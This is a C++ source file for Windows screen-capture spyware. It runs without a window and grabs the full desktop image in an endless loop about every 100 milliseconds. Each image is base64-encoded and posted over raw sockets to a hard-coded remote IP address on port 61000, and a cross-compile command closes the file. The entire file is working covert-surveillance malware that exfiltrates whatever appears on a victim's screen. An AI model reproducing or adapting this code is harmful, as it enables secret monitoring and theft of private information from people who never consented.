#include <iostream>
#include <sstream>
#include <string>
#include <windows.h>
#include <unistd.h>
#include <memory>
#include <winsock2.h>

using namespace std;

#include "gdi/include/GdiPlus.h"

using namespace Gdiplus;

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int send_post(string encoded) {
    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    string hostname = "192.168.0.118";
    // string hostname = "192.241.213.182";
    SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct hostent *host;
    host = gethostbyname(hostname.c_str());

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port = htons(61000);
    SockAddr.sin_family = AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0){
        return 1;
    }

    time_t timestamp = time(NULL);
    ostringstream ostr_timestamp;
    ostr_timestamp << timestamp;
    string str_timestamp = ostr_timestamp.str();

    ostringstream stream;

    stream << "POST / HTTP/1.1\r\n";
    stream << "Host: " << hostname << "\r\n";
    stream << "Accept: text/html,*/*\r\n";
    stream << "Connection: close\r\n";
    stream << "Content-Type: application/x-www-form-urlencoded\r\n";
    stream << "Content-Length: " << (1+encoded.length()+10+str_timestamp.length()+1) << "\r\n\r\n";
    stream << "image=" << encoded << "&time=" << timestamp;

    string request = stream.str();
    send(Socket, request.c_str(), request.length(), 0);

    closesocket(Socket);
    WSACleanup();

    return 0;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789-_";

std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret; int i = 0; int j = 0; unsigned char char_array_3[3]; unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; (i <4) ; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for(j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];
    }

    return ret;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0, size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;  // Failure

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; ++j) {
        if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

string file_to_string(string filename) {
    string str_file;
    FILE *file;

    file = fopen(filename.c_str(), "rb");

    char ch;
    while(!feof(file)) {
        ch = fgetc(file);

        if(ferror(file)) exit(1);
        if(!feof(file)) str_file += ch;
    }

    if (fclose(file)==EOF) exit(1);

    return str_file;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

void capture_screen() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    CLSID jpgClsid;
    GetEncoderClsid(L"image/jpeg", &jpgClsid);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, width, height);

    SelectObject(hCaptureDC, hCaptureBitmap);
    BitBlt(hCaptureDC, 0, 0, width, height, hDesktopDC, 0, 0, SRCCOPY|CAPTUREBLT);

    Bitmap bpm_screen(hCaptureBitmap, (HPALETTE)1);

    ReleaseDC(hDesktopWnd, hDesktopDC);
    DeleteDC(hCaptureDC);
    DeleteObject(hCaptureBitmap);

    bpm_screen.Save(L"image.jpg", &jpgClsid, NULL);

    const string to_encode = file_to_string("image.jpg");
    string encoded = base64_encode(reinterpret_cast<const unsigned char*>(to_encode.c_str()), to_encode.length());

    send_post(encoded);
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
    while (true) {
        capture_screen();

        usleep(1000 * 100);
    }

    return 0;
}

// i586-mingw32msvc-g++ -mwindows -o screen_capture.exe screen_capture.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32
